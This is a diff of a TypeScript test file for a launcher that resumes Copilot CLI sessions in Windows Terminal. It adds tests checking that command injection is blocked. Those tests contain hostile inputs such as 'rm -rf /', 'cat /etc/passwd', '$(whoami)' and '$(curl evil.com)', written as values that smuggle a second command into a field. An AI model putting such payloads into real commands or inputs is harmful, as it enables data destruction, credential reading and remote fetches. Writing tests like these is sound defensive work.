@@ -8,6 +8,7 @@ vi.mock('child_process', () => ({
   spawn: vi.fn(() => ({ unref: vi.fn() })),
   execFile: vi.fn(),
   execFileSync: vi.fn(() => 'C:\\Program Files\\PowerShell\\7\\pwsh.exe\n'),
+  execSync: vi.fn(() => 'C:\\Program Files\\nodejs\\copilot.cmd\n'),
 }));
 
 // Mock shells module to return predictable results
@@ -17,8 +18,8 @@ vi.mock('../src/main/shells', () => ({
     { name: 'cmd', path: 'C:\\Windows\\System32\\cmd.exe', displayName: 'Command Prompt', isDefault: false },
   ]),
   getTerminals: vi.fn(() => [
-    { name: 'windows-terminal', path: 'C:\\Users\\test\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe', displayName: 'Windows Terminal', isDefault: true, supportsNewTab: true, supportsSplitPane: true },
-    { name: 'cmd', path: 'C:\\Windows\\System32\\cmd.exe', displayName: 'Command Prompt Window', isDefault: false, supportsNewTab: false, supportsSplitPane: false },
+    { name: 'windows-terminal', path: 'C:\\Users\\test\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe', displayName: 'Windows Terminal', isDefault: true, supportsNewTab: true },
+    { name: 'cmd', path: 'C:\\Windows\\System32\\cmd.exe', displayName: 'Command Prompt Window', isDefault: false, supportsNewTab: false },
   ]),
 }));
 
@@ -37,148 +38,162 @@ describe('LaunchManager', () => {
     vi.clearAllMocks();
   });
 
-  describe('buildResumeCommand (via launchInPlace)', () => {
-    it('builds basic resume command', () => {
-      launcher.launchInPlace('abc-123');
+  describe('launch', () => {
+    it('uses Windows Terminal with -w dispatch and new-tab', () => {
+      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
 
-      expect(spawnMock).toHaveBeenCalledWith(
-        'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
-        ['-NoProfile', '-Command', 'gh copilot session resume abc-123'],
-        expect.objectContaining({ detached: true }),
-      );
+      launcher.launch('test-id');
+
+      const binary = spawnMock.mock.calls[0][0] as string;
+      const args = spawnMock.mock.calls[0][1] as string[];
+      expect(binary).toBe('wt.exe');
+      expect(args).toContain('-w');
+      expect(args).toContain('dispatch');
+      expect(args).toContain('new-tab');
+      expect(args).toContain('--title');
     });
 
-    it('includes --yolo flag when yoloMode is true', () => {
-      launcher.launchInPlace('abc-123', { yoloMode: true });
+    it('builds basic resume command', () => {
+      launcher.launch('abc-123');
 
       const args = spawnMock.mock.calls[0][1] as string[];
-      const command = args[args.length - 1];
-      expect(command).toContain('--yolo');
+      const commandArg = args.find((a) => a.includes('copilot --resume abc-123'));
+      expect(commandArg).toBeDefined();
+    });
+
+    it('includes --allow-all flag when yoloMode is true', () => {
+      launcher.launch('abc-123', { yoloMode: true });
+
+      const args = spawnMock.mock.calls[0][1] as string[];
+      const commandArg = args.find((a) => a.includes('--allow-all'));
+      expect(commandArg).toBeDefined();
     });
 
     it('includes --agent flag when specified', () => {
-      launcher.launchInPlace('abc-123', { agent: 'developer' });
+      launcher.launch('abc-123', { agent: 'developer' });
 
       const args = spawnMock.mock.calls[0][1] as string[];
-      const command = args[args.length - 1];
-      expect(command).toContain('--agent developer');
+      const commandArg = args.find((a) => a.includes('--agent developer'));
+      expect(commandArg).toBeDefined();
     });
 
     it('includes --model flag when specified', () => {
-      launcher.launchInPlace('abc-123', { model: 'claude-sonnet-4' });
+      launcher.launch('abc-123', { model: 'claude-sonnet-4' });
 
       const args = spawnMock.mock.calls[0][1] as string[];
-      const command = args[args.length - 1];
-      expect(command).toContain('--model claude-sonnet-4');
+      const commandArg = args.find((a) => a.includes('--model claude-sonnet-4'));
+      expect(commandArg).toBeDefined();
     });
 
     it('uses customCommand when provided', () => {
-      launcher.launchInPlace('abc-123', { customCommand: 'echo hello' });
+      launcher.launch('abc-123', { customCommand: 'echo hello' });
 
       const args = spawnMock.mock.calls[0][1] as string[];
-      const command = args[args.length - 1];
-      expect(command).toBe('echo hello');
+      const commandArg = args.find((a) => a.includes('echo hello'));
+      expect(commandArg).toBeDefined();
     });
 
     it('combines all flags correctly', () => {
-      launcher.launchInPlace('sess-id', {
+      launcher.launch('sess-id', {
         yoloMode: true,
         agent: 'tester',
         model: 'gpt-5',
       });
 
       const args = spawnMock.mock.calls[0][1] as string[];
-      const command = args[args.length - 1];
-      expect(command).toBe('gh copilot session resume sess-id --yolo --agent tester --model gpt-5');
+      const commandArg = args.find((a) => a.includes('copilot --resume sess-id --allow-all --agent tester --model gpt-5'));
+      expect(commandArg).toBeDefined();
     });
   });
 
   describe('shell resolution', () => {
-    it('uses default shell when no shell specified', () => {
-      launcher.launchInPlace('test-id');
+    it('uses cmd.exe when cmd shell specified', () => {
+      launcher.launch('test-id', { shell: 'cmd' });
 
-      // pwsh is the default in our mock
-      expect(spawnMock.mock.calls[0][0]).toBe('C:\\Program Files\\PowerShell\\7\\pwsh.exe');
-    });
-
-    it('uses specified shell by name', () => {
-      launcher.launchInPlace('test-id', { shell: 'cmd' });
-
-      expect(spawnMock.mock.calls[0][0]).toBe('C:\\Windows\\System32\\cmd.exe');
+      const args = spawnMock.mock.calls[0][1] as string[];
+      expect(args).toContain('cmd.exe');
+      expect(args).toContain('/k');
     });
 
     it('returns error when shell not found', () => {
-      const result = launcher.launchInPlace('test-id', { shell: 'nonexistent' });
+      const result = launcher.launch('test-id', { shell: 'nonexistent' });
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('No suitable shell');
     });
   });
 
-  describe('shell argument building', () => {
-    it('uses -NoProfile -Command for pwsh', () => {
-      launcher.launchInPlace('id', { shell: 'pwsh' });
-
-      const args = spawnMock.mock.calls[0][1] as string[];
-      expect(args[0]).toBe('-NoProfile');
-      expect(args[1]).toBe('-Command');
-    });
-
-    it('uses /c for cmd', () => {
-      launcher.launchInPlace('id', { shell: 'cmd' });
-
-      const args = spawnMock.mock.calls[0][1] as string[];
-      expect(args[0]).toBe('/c');
-    });
-  });
-
-  describe('launchNewTab', () => {
-    it('uses Windows Terminal wt.exe with new-tab args', () => {
-      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
-
-      launcher.launchNewTab('test-id');
-
-      const binary = spawnMock.mock.calls[0][0];
-      const args = spawnMock.mock.calls[0][1] as string[];
-      expect(binary).toContain('wt.exe');
-      expect(args).toContain('-w');
-      expect(args).toContain('0');
-      expect(args).toContain('new-tab');
-    });
-  });
-
-  describe('launchSplitPane', () => {
-    it('returns error when terminal does not support split panes', () => {
-      const result = launcher.launchSplitPane('test-id', { terminal: 'cmd' });
-
+  describe('input validation (command injection prevention)', () => {
+    it('rejects session IDs with shell metacharacters (;)', () => {
+      const result = launcher.launch('valid-id; rm -rf /');
       expect(result.success).toBe(false);
-      expect(result.error).toContain('not supported');
+      expect(result.error).toContain('Invalid session ID');
+      expect(spawnMock).not.toHaveBeenCalled();
     });
 
-    it('uses split-pane with -H for horizontal direction', () => {
-      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
-
-      launcher.launchSplitPane('test-id', { paneDirection: 'horizontal' });
-
-      const args = spawnMock.mock.calls[0][1] as string[];
-      expect(args).toContain('split-pane');
-      expect(args).toContain('-H');
+    it('rejects session IDs with ampersand', () => {
+      const result = launcher.launch('id && calc.exe');
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
     });
 
-    it('uses split-pane with -V for vertical direction', () => {
-      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
+    it('rejects session IDs with pipe operator', () => {
+      const result = launcher.launch('id | cat /etc/passwd');
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
+    });
 
-      launcher.launchSplitPane('test-id', { paneDirection: 'vertical' });
+    it('rejects session IDs with $() subshell', () => {
+      const result = launcher.launch('$(whoami)');
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
+    });
 
-      const args = spawnMock.mock.calls[0][1] as string[];
-      expect(args).toContain('split-pane');
-      expect(args).toContain('-V');
+    it('rejects session IDs with backticks', () => {
+      const result = launcher.launch('`id`');
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
+    });
+
+    it('rejects session IDs exceeding 128 characters', () => {
+      const longId = 'a'.repeat(129);
+      const result = launcher.launch(longId);
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
+    });
+
+    it('rejects session IDs starting with a dot', () => {
+      const result = launcher.launch('.hidden-id');
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid session ID');
+    });
+
+    it('accepts valid UUID-style session IDs', () => {
+      const result = launcher.launch('a1b2c3d4-e5f6-7890-abcd-ef1234567890');
+      expect(result.success).toBe(true);
+    });
+
+    it('rejects agent name with shell metacharacters', () => {
+      const result = launcher.launch('valid-id', { agent: 'test; rm -rf /' });
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid agent name');
+    });
+
+    it('rejects model name with shell metacharacters', () => {
+      const result = launcher.launch('valid-id', { model: '$(curl evil.com)' });
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid model name');
+    });
+
+    it('accepts valid agent and model names', () => {
+      const result = launcher.launch('valid-id', { agent: 'coding-agent', model: 'claude-sonnet-4.5' });
+      expect(result.success).toBe(true);
     });
   });
 
   describe('launchMulti', () => {
     it('launches multiple sessions', () => {
-      const results = launcher.launchMulti(['id-1', 'id-2', 'id-3'], 'inPlace');
+      const results = launcher.launchMulti(['id-1', 'id-2', 'id-3']);
 
       expect(results).toHaveLength(3);
       expect(results.every((r) => r.success)).toBe(true);
@@ -186,7 +201,7 @@ describe('LaunchManager', () => {
     });
 
     it('returns individual results for each session', () => {
-      const results = launcher.launchMulti(['id-1', 'id-2'], 'inPlace', { shell: 'nonexistent' });
+      const results = launcher.launchMulti(['id-1', 'id-2'], { shell: 'nonexistent' });
 
       expect(results).toHaveLength(2);
       expect(results[0].success).toBe(false);
@@ -202,7 +217,7 @@ describe('LaunchManager', () => {
         throw err;
       });
 
-      const result = launcher.launchInPlace('test-id');
+      const result = launcher.launch('test-id');
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('not found');
@@ -215,7 +230,7 @@ describe('LaunchManager', () => {
         throw err;
       });
 
-      const result = launcher.launchInPlace('test-id');
+      const result = launcher.launch('test-id');
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('Permission denied');
